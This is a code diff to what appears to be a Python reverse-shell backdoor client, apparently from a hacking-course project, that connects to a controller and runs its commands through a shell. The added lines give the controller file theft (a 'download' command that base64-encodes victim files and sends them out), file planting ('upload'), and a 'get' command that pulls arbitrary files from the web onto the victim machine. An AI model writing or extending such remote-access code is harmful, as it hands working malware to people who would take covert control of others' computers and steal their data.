@@ -6,6 +6,8 @@ import time
 import os
 import sys
 import shutil
+import base64
+import requests
 
 ServerIP="127.0.0.1"
 ServerPort=12345
@@ -38,6 +40,39 @@ def communication():
     while True:
         command = reliable_recv()
         if command=='q': break
+        elif command[:2] == "cd" and len(command)>1:
+            # change director
+            try:
+                os.chdir(command[3:])
+            except:
+                continue
+            
+        elif command[:8] =="download":
+            try:
+                with open(command[9:],"rb")as file_down:
+                    content = file_down.read()
+                    reliable_send(base64.b64encode(content).decode("ascii"))
+            except:
+                failed ="[!!] Failed to download"
+                reliable_send(failed)
+                
+        elif command[:6]=="upload":
+            result = reliable_recv()
+            if result[:4] !="[!!]":
+                with open(command[7:],"wb") as file_up:
+                    file_up.write(base64.b64decode(result))
+                    
+        elif command[:3] == "get":
+            try:
+                url =command[4:]
+                get_response =requests.get(url)
+                file_name = url.split("/")[-1]
+                with open(file_name, "wb") as out_file:
+                    out_file.write(get_response.content)
+                reliable_send("[+] File Downloaded.")
+            except:
+                reliable_send("[!!] Download Failed.")
+                
         else:
             proc = subprocess.Popen(command, shell=True,stdout=subprocess.PIPE , stderr=subprocess.PIPE , stdin=subprocess.PIPE)
             response = proc.stdout.read() + proc.stderr.read()
